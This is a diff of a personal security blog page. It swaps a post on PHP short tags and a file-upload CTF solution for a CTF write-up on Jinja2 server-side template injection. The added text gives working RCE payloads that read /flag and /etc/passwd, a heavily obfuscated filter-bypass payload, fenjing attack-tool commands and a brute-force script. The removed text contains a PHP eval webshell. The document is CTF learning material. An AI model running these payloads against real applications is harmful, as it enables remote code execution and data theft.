@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="短标签, wuk0Ng">
+    <meta name="keywords" content="ssti实战多方法解题1, wuk0Ng">
     <meta name="description" content="wuk0Ng的个人博客">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>短标签 | wuk0Ng</title>
+    <title>ssti实战多方法解题1 | wuk0Ng</title>
     <link rel="icon" type="image/jpeg" href="/shaoqing.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -320,12 +320,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">短标签</h1>
+                    <h1 class="description center-align post-title">ssti实战多方法解题1</h1>
                 </div>
             </div>
         </div>
@@ -491,29 +491,79 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h1><p>用法常规是在说，我的这个上传的文件的内容会被检验，有php这个东西的就不行的这种情况</p>
-<h2 id="正常写法"><a href="#正常写法" class="headerlink" title="正常写法"></a>正常写法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo 1;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="短标签写法"><a href="#短标签写法" class="headerlink" title="短标签写法"></a>短标签写法</h2><p>需要 php.ini 配置文件中的指令 short_open_tag 打开后才可用，或者在 PHP 编译时加入了 –enable-short-tags 选项。自 PHP5.4 起，短格式的 echo 标记 &lt;?&#x3D; 总会被识别并且合法，而不管 short_open_tag 的设置是什么</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">echo 1;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>5.4起</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=</span><br><span class="line">&#x27;hello&#x27;;</span><br></pre></td></tr></table></figure>
-<p>和</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">echo &#x27;hello&#x27;;</span><br></pre></td></tr></table></figure>
-<p>作用是一样的</p>
-<h2 id="7-0以下可用，无需调整参数"><a href="#7-0以下可用，无需调整参数" class="headerlink" title="7.0以下可用，无需调整参数"></a>7.0以下可用，无需调整参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="不推荐写法"><a href="#不推荐写法" class="headerlink" title="不推荐写法"></a>不推荐写法</h2><p>为了 asp 程序员学习 php 所添加的语法糖写法。需要通过 php.ini 配置文件中的指令 asp_tags 打开后才可用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line">echo 1;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="php7后不解析，长标签写法"><a href="#php7后不解析，长标签写法" class="headerlink" title="php7后不解析，长标签写法"></a>php7后不解析，长标签写法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt; echo 1; &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+                <p>我们借助一道题的多种解法，来加深我们对于ssti的一个理解</p>
+<h1 id="LitCTF-2025-星愿信箱"><a href="#LitCTF-2025-星愿信箱" class="headerlink" title="[LitCTF 2025]星愿信箱"></a>[LitCTF 2025]星愿信箱</h1><p>首先当然是判断我们的这个模板对吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;第一个，我们理解为根部</span><br><span class="line">失败：来到第一个子部：&#123;&#123;7*7&#125;&#125;</span><br><span class="line">成功：来到第二个子部：a&#123;*comment*&#125;b</span><br><span class="line">第一个子部：</span><br><span class="line">    成功：那就是jinja2或者twig的。且我们输入&#123;&#123;7*&#x27;7&#x27;&#125;&#125;,回显7777777说明是jinjia2模板，回显49的话就说明是Twig</span><br><span class="line">第二个子部：成功，那就是Smarty。只返回comment的内容</span><br><span class="line">          失败，来到第三个子部</span><br><span class="line">第三个子部：$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;，成功就是Mako</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我们先输入`$&#123;7*7&#125;`，显示说需要包含文字内容，哈哈，这下我的fenjing用法就解决不了这个问题了</span><br><span class="line">我们输入`我爱你$&#123;7*7&#125;`回显了一个一摸一样的，失败，来到第一个子部`我爱你&#123;&#123;7*7&#125;&#125;`，这里发现被屏蔽了，屏蔽了&#123;&#123;&#125;&#125;猜测，说明就是jinjia2模板了</span><br><span class="line">`我爱你&#123;% if 2&gt;1 %&#125;BenBen&#123;%endif%&#125;`回显我爱你benben</span><br><span class="line">这里就已经绕过waf了</span><br></pre></td></tr></table></figure>
+<h2 id="偷懒方法"><a href="#偷懒方法" class="headerlink" title="偷懒方法"></a>偷懒方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.os.popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123; lipsum.__globals__.os.popen(&#x27;cat /flag&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这三个结合题目，形式发生变化为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;nl /flag&#x27;).read())%&#125;</span><br><span class="line">&#123;%print(url_for.__globals__.os.popen(&#x27;nl /flag&#x27;).read())%&#125;</span><br><span class="line">&#123;%print(lipsum.__globals__.os.popen(&#x27;nl /flag&#x27;).read())%&#125;</span><br></pre></td></tr></table></figure>
+<p>这三个都是可以的<br>就是直接套用模板，什么都不用做就可以拿到flag了</p>
+<h2 id="fenjing"><a href="#fenjing" class="headerlink" title="fenjing"></a>fenjing</h2><p>fenjing也是偷懒做法，但是这道题目比较特殊，就是说，我们的这个要前面有中文才可以<br>一般地用这个就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing scan --url http://node4.anna.nssctf.cn:28829/</span><br></pre></td></tr></table></figure>
+<h3 id="万能（假）"><a href="#万能（假）" class="headerlink" title="万能（假）"></a>万能（假）</h3><p>然后还记得我们的一个万能的一个吗（不是所有的都可以，只能过一些常规的）。这道题目是直接就出flag了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set jy=dict(GET=x)|first|lower%&#125;&#123;%set dh=dict(OS=x)|first|lower%&#125;&#123;%set po=dict(POPEN=x)|first|lower%&#125;&#123;%set re=dict(READ=x)|first|lower%&#125;&#123;%set ob=dict(x=x)|count%&#125;&#123;%set ni=dict(GLOBALS=x)|first|lower%&#125;&#123;%set fp=dict(GETITEM=x)|first|lower%&#125;&#123;%set bu=dict(BUILTINS=x)|first|lower%&#125;&#123;%set im=dict(IMPORT=x)|first|lower%&#125;&#123;%set bt=joiner|urlencode|wordcount%&#125;&#123;%set mt=cycler|escape|urlencode|count%&#125;&#123;%set pj=dict(aaaaa=x)|first|count%&#125;&#123;%set jm=namespace|escape|count%&#125;&#123;%set xo=namespace|escape|urlencode|escape|urlencode|count%&#125;&#123;%set et=(bt,bt,bt,bt,bt,ob,ob)|sum%&#125;&#123;%set ru=(&#123;&#125;|escape|urlencode|first,dict(c=x)|join)|join%((xo,pj)|sum)%&#125;&#123;%set uc=(ru*(ob,ob)|sum,ni,ru*(ob,ob)|sum)|join%&#125;&#123;%set ya=(ru*(ob,ob)|sum,fp,ru*(ob,ob)|sum)|join%&#125;&#123;%set bl=(ru*(ob,ob)|sum,bu,ru*(ob,ob)|sum)|join%&#125;&#123;%set ip=(ru*(ob,ob)|sum,im,ru*(ob,ob)|sum)|join%&#125;&#123;%set ad=dict(ADD=x)|first|lower%&#125;&#123;%set sx=(ru*(ob,ob)|sum,ad,ru*(ob,ob)|sum)|join%&#125;&#123;%set ke=dict(a=x,b=x,c=x)|count%&#125;&#123;%set mq=(ke,ob)|sum%&#125;&#123;%set ta=dict(TAC=x)|first|lower|attr(sx)(((&#123;&#125;|escape|urlencode|first,dict(c=x)|join)|join*(bt,ob,ob)|sum)%((bt,bt,bt,bt,bt,ob)|sum,(mt,bt,ob)|sum,(mt,pj)|sum,(mt,bt,bt,mq)|sum,(bt,bt,bt,bt,bt,ob)|sum,(jm,bt,mq)|sum,(jm,ob)|sum,(xo,bt,pj)|sum,(et,pj)|sum))%&#125;&#123;%print (((((session|attr(jy)|attr(uc)|attr(ya))(bl)|attr(ya))(ip))(dh)|attr(po))(ta)|attr(re))()%&#125;</span><br></pre></td></tr></table></figure>
+<p>我们就需要好好学一下fenjing怎么用就可以了<br>在这之前，抓包得知是post传参的<br>json格式如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;11&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>参考文档我下在电脑上了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing crack-json --url &#x27;http://node6.anna.nssctf.cn:29821/&#x27; --json-data &#x27;&#123;&quot;cmd&quot;: &quot;a&quot;&#125;&#x27; --key cmd</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing crack-json --url &#x27;http://node6.anna.nssctf.cn:29821/&#x27; --json-data &#x27;&#123;&quot;cmd&quot;: &quot;a&quot;&#125;&#x27; --key cmd --replaced-keyword-strategy ignore</span><br></pre></td></tr></table></figure>
+<p>下面的这个是参考的一个wp的paylaod，我发现我用不了这个命令，然后我发现我的fenjing版本什么的是有问题，反正很多常见功能是没有的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing --help</span><br></pre></td></tr></table></figure>
+<p>一开始回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing --help</span><br><span class="line">Usage: python -m fenjing [OPTIONS] COMMAND [ARGS]...</span><br><span class="line"></span><br><span class="line">  click的命令组</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --help  Show this message and exit.</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  crack          攻击指定的表单</span><br><span class="line">  crack-path     攻击指定的路径</span><br><span class="line">  crack-request  从文本文件中读取请求并攻击目标，文本文件中用PAYLOAD标记payload插入位置</span><br><span class="line">  scan           扫描指定的网站</span><br><span class="line">  webui          启动webui</span><br></pre></td></tr></table></figure>
+<p>下载了最新版本的回显的就是我要的了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing --help</span><br><span class="line">Usage: python -m fenjing [OPTIONS] COMMAND [ARGS]...</span><br><span class="line"></span><br><span class="line">  click的命令组</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --silent, --shutup  不打印INFO等</span><br><span class="line">  --help              Show this message and exit.</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  crack           攻击指定的表单</span><br><span class="line">  crack-json      攻击指定的JSON API</span><br><span class="line">  crack-keywords  根据关键字生成对应的payload</span><br><span class="line">  crack-path      攻击指定的路径</span><br><span class="line">  crack-request   从文本文件中读取请求并攻击目标，文本文件中用`PAYLOAD`标记payload插入位置</span><br><span class="line">  scan            扫描指定的网站</span><br><span class="line">  webui           启动webui</span><br></pre></td></tr></table></figure>
+<p>功能完善后还是报错了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing crack-json --url &quot;http://node6.anna.nssctf.cn:29821/&quot; --json-data &quot;&#123;\&quot;cmd\&quot;: \&quot;a\&quot;&#125;&quot; --key cmd</span><br></pre></td></tr></table></figure>
+<p>最后换成这个命令开始运行了，但是还是拿不到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing crack-json --url &#x27;http://node6.anna.nssctf.cn:24986/&#x27; --json-data &quot;&#123;\&quot;cmd\&quot;: \&quot;a\&quot;&#125;&quot; --key cmd --replaced-keyword-strategy ignore</span><br><span class="line">fenjing crack-json --url &#x27;http://node6.anna.nssctf.cn:28919/&#x27; --json-data &quot;&#123;\&quot;cmd\&quot;: \&quot;a\&quot;&#125;&quot; --key cmd --replaced-keyword-strategy ignore</span><br></pre></td></tr></table></figure>
+<p>这个参考wp的命令还是拿不到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing crack-json --url &#x27;http://node6.anna.nssctf.cn:27524/&#x27; --json-data &quot;&#123;\&quot;cmd\&quot;: \&quot;a\&quot;&#125;&quot; --key cmd --replaced-keyword-strategy ignore</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>上面这些都是人家的wp给的形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing crack-json --url &quot;http://node6.anna.nssctf.cn:27524/&quot; --json-data &quot;&#123;\&quot;cmd\&quot;: \&quot;a\&quot;&#125;&quot; --key cmd --replaced-keyword-strategy ignore</span><br></pre></td></tr></table></figure>
+<p>报错信息给gpt看，就是url栏那里进行修改就可以拿到flag了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing crack-json --url &quot;http://node6.anna.nssctf.cn:27524/&quot; --json-data &quot;&#123;\&quot;cmd\&quot;: \&quot;a\&quot;&#125;&quot; --key cmd</span><br></pre></td></tr></table></figure>
+<p>这个是可以的，单双引号和这个转义符的区分</p>
+<h2 id="常规解法"><a href="#常规解法" class="headerlink" title="常规解法"></a>常规解法</h2><p>首先我们要知道，paylaod大致的样子如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(&quot;&quot;.__class__.__base__.__subclasses__()[&#x27; +str(i)+ &#x27;].__init__.__globals__[&quot;popen&quot;](&quot;cat /etc/passwd&quot;).read())%&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &quot;&quot;.__class__ %&#125;BenBen&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>
+<p>用这两条都是可以的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://node6.anna.nssctf.cn:23338/&quot;</span><br><span class="line"></span><br><span class="line">for i in range(300):</span><br><span class="line">    try:</span><br><span class="line">        data = &#123;&quot;cmd&quot;: f&#x27;&#123;&#123;%print(&quot;&quot;.__class__.__base__.__subclasses__()[&#123;i&#125;])%&#125;&#125;&#x27;&#125;</span><br><span class="line">        response = requests.post(url, json=data)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            if &quot;os._wrap_close&quot; in response.text:</span><br><span class="line">                print(i, &quot;---&gt;&quot;, data)</span><br><span class="line">                break</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
+<p>如果是写脚本的话，肯定是一步一步地测试，不断地改我们的脚本才行<br>这里遇到一个问题，就是括号的问题<br>这里只有一个大括号，脚本和之前的两个括号的脚本是有很多地方不一样的<br>应该是这里传输数据的方式是json，所有才会说之前的脚本跑不了</p>
+<p>你问得非常好！我们就聚焦在你关心的部分：</p>
+<hr>
+<p>🎯 关注点：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">f&#x27;&#123;&#123;%print(&quot;&quot;.__class__.__base__.__subclasses__()[<span class="subst">&#123;i&#125;</span>])%&#125;&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">你想问的是：</span><br><span class="line">这个字符串里 `&#123;&#123;`、`&#125;&#125;` 怎么用的？**Python 的 f-string 和模板语法 `&#123;% ... %&#125;` 混在一起，它们怎么不冲突？**</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="✅-这是-Python-f-string-里的转义规则问题"><a href="#✅-这是-Python-f-string-里的转义规则问题" class="headerlink" title="✅ 这是 Python f-string 里的转义规则问题"></a>✅ 这是 Python f-string 里的转义规则问题</h2><h3 id="🔹-1-外层是-Python-的-f-string："><a href="#🔹-1-外层是-Python-的-f-string：" class="headerlink" title="🔹 1. 外层是 Python 的 f-string："></a>🔹 1. 外层是 Python 的 f-string：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">f&#x27;...<span class="subst">&#123;i&#125;</span>...&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python 会处理花括号 `&#123;&#125;`，比如：</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;Alice&quot;</span></span><br><span class="line"><span class="string">f&quot;Hello <span class="subst">&#123;name&#125;</span>&quot;</span>  → <span class="string">&quot;Hello Alice&quot;</span></span><br></pre></td></tr></table></figure>
 
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">### 🔹 2. 那 `&#123;%print(...)%&#125;` 里的 `&#123;` 和 `%` 怎么办？</span><br></pre></td></tr></table></figure>
+<p>你用了这段：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">f&#x27;&#123;&#123;%print(...)%&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="LitCTF-2025-easy-file"><a href="#LitCTF-2025-easy-file" class="headerlink" title="[LitCTF 2025]easy_file"></a>[LitCTF 2025]easy_file</h1><p>首先进来目录扫描一下，发现有&#x2F;admin.php（重定向到index.php)和&#x2F;login.php还有&#x2F;uploads<br>当时比赛的时候，我已经和爆破出来了账号密码了<br>这里账号admin就行了（当然也有可能是admin123这些）<br>账号和密码会被base64处理，用脚本把我们的字典处理一下（或者直接用bp里面的功能就能实现）<br>爆破账号密码就选集束炸弹，单个就选狙击手<br>这里很简单就可以爆破出来账号是admin，密码是password<br>之前就卡在了这一步，进入了后面发现，还有一个文件上传的题目在等着我<br>我当时比赛的时候试了很多的情况都没有成功<br>后面怎么打？<br>首先是没有登陆进去之前，有一个</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//file查看头像</span><br></pre></td></tr></table></figure>
-<p>的这个提示<br>我们这里就可以考虑文件包含的这个方面的内容了<br>首先，我们思路一定是说，要么直接上传一个php文件，通过改后缀这些等等<br>还有就是，上传图片，然后让服务器把图片内容当成php来解析<br>我的火狐的浏览器有一些问题，每次需要到microsoft里面，才能正确看到版本信息这些，php版本是7.3版本的</p>
-<p>对于这个题目，我们结合题目告诉你的<br>这个是我们的木马</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
-<p>放进txt文件里就可以了<br>思路就是利用 file 读取上传的 xjmuma.txt 文件，然后文件就被解析咯</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node6.anna.nssctf.cn:25621/admin.php?file=uploads/muma.txt</span><br></pre></td></tr></table></figure>
-<p>访问这个就可以了<br>post传入我们的参数<br>最后拿到flag</p>
+<ul>
+<li><code>&#123;&#123;` 会变成单个 `&#123;`
+* `&#125;&#125;</code> 会变成单个 <code>&#125;</code></li>
+<li>这是 <strong>f-string 的写法规则</strong>，用两个花括号 <code>&#123;&#123;` 和 `&#125;&#125;</code> 才能输出真实的 <code>&#123;</code> 和 <code>&#125;</code> 字符。</li>
+</ul>
+<hr>
+<h3 id="✅-举个简单例子："><a href="#✅-举个简单例子：" class="headerlink" title="✅ 举个简单例子："></a>✅ 举个简单例子：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">f&#x27;&#123;&#123;abc&#125;&#125;&#x27;</span>  → <span class="string">&#x27;&#123;abc&#125;&#x27;</span></span><br><span class="line"><span class="string">f&#x27;&#123;&#123;%print(&quot;Hello&quot;)%&#125;&#125;&#x27;</span> → <span class="string">&#x27;&#123;%print(&quot;Hello&quot;)%&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="✅-所以你这一句："><a href="#✅-所以你这一句：" class="headerlink" title="✅ 所以你这一句："></a>✅ 所以你这一句：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">f&#x27;&#123;&#123;%print(&quot;&quot;.__class__.__base__.__subclasses__()[<span class="subst">&#123;i&#125;</span>])%&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 外层 f-string 中的 `&#123;&#123;` 会变成 `&#123;`</span><br><span class="line">* `&#125;&#125;` 会变成 `&#125;`</span><br><span class="line">* `&#123;i&#125;` 会被实际的数字代入，比如 `137`</span><br></pre></td></tr></table></figure>
+<p>最终的效果就是动态构造出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(&quot;&quot;.__class__.__base__.__subclasses__()[137])%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>完美符合 Jinja2 模板的语法。</p>
+<hr>
+<h3 id="✅-总结一句话："><a href="#✅-总结一句话：" class="headerlink" title="✅ 总结一句话："></a>✅ 总结一句话：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* `&#123;&#123;` 和 `&#125;&#125;` 是为了告诉 Python f-string：**“我想输出一个花括号”**。</span><br><span class="line">* `&#123;i&#125;` 是正常的变量替换。</span><br><span class="line">* 所以你才能安全地写出模板语言中需要的 `&#123;% ... %&#125;` 结构，而不被 Python 报错。</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">如果你想测试多个变量一起拼成模板指令，也可以，我可以帮你构造复杂的 payload 字符串。是否要继续往 `popen()` 那块构造执行命令的 payload？</span><br><span class="line"></span><br><span class="line">除了写这个脚本，还可以说就是，我们直接在这里的这个bp去爆破，先构造好语句，只差我们剩下的数字</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是有很多的相关的一些过滤呀什么的，做过的相关练习还是有些偏少的，慢慢积累</p>
 
                 
             </div>
@@ -540,7 +590,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://web-wuk0ng.github.io/2025/06/19/%E7%9F%AD%E6%A0%87%E7%AD%BE/">https://web-wuk0ng.github.io/2025/06/19/%E7%9F%AD%E6%A0%87%E7%AD%BE/</a>
+                    <a href="https://web-wuk0ng.github.io/2025/06/19/ssti%E5%AE%9E%E6%88%98%E5%A4%9A%E6%96%B9%E6%B3%95%E8%A7%A3%E9%A2%981/">https://web-wuk0ng.github.io/2025/06/19/ssti%E5%AE%9E%E6%88%98%E5%A4%9A%E6%96%B9%E6%B3%95%E8%A7%A3%E9%A2%981/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -758,7 +808,7 @@
     repo: 'blog---comments',
     owner: 'web-wuk0Ng',
     admin: ["web-wuk0Ng"],
-    id: '2025-06-19T15-00-00',
+    id: '2025-06-19T20-00-00',
     distractionFreeMode: false
   });
 
@@ -784,9 +834,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2025/06/19/ssti%E5%AE%9E%E6%88%98%E5%A4%9A%E6%96%B9%E6%B3%95%E8%A7%A3%E9%A2%981/">
                     <div class="card-image">
@@ -804,9 +855,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-06-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-06-19
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -819,6 +870,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -841,13 +893,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/06/15/%E7%9F%AD%E6%9C%9F%E7%B2%97%E6%9A%B4%E8%A7%84%E5%88%92/">
+                <a href="/2025/06/19/%E7%9F%AD%E6%A0%87%E7%AD%BE/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="短期的一个粗暴规划">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="短标签">
                         
-                        <span class="card-title">短期的一个粗暴规划</span>
+                        <span class="card-title">短标签</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -858,7 +910,7 @@
                     </div>
